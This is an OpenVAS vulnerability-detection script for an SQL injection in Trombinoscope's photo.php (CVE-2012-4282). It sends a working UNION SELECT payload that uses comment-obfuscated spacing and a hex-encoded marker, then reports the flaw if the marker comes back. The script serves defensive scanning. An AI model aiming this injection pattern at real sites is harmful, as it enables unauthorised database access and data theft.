###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_trombinoscope_53398.nasl 11435 2018-09-17 13:44:25Z cfischer $
#
# Trombinoscope 'photo.php' Server SQL Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103538");
  script_bugtraq_id(53398);
  script_cve_id("CVE-2012-4282");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_version("$Revision: 11435 $");
  script_name("Trombinoscope 'photo.php' Server SQL Injection Vulnerability");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53398");
  script_xref(name:"URL", value:"http://www.toocharger.com");
  script_xref(name:"URL", value:"http://ftp1.toocharger.com/sc2MP3p/trombinoscope_4116.zip");
  script_tag(name:"last_modification", value:"$Date: 2018-09-17 15:44:25 +0200 (Mon, 17 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-08-17 10:39:03 +0200 (Fri, 17 Aug 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"summary", value:"Trombinoscope is prone to an SQL-injection vulnerability because it
fails to sufficiently sanitize user-supplied data before using it in
an SQL query.");

  script_tag(name:"impact", value:"Exploiting this issue could allow an attacker to compromise the
application, access or modify data, or exploit latent vulnerabilities
in the underlying database.");

  script_tag(name:"affected", value:"Trombinoscope 3.5 and prior versions are vulnerable.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

foreach dir( make_list_unique( "/trombi", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  url = dir + '/photo.php?id=-9999/**/union/**/select/**/1,2,0x53514c2d496e6a656374696f6e2d54657374--';

  if( http_vuln_check( port:port, url:url, pattern:"SQL-Injection-Test", extra_check:"<title>Trombinoscope" ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
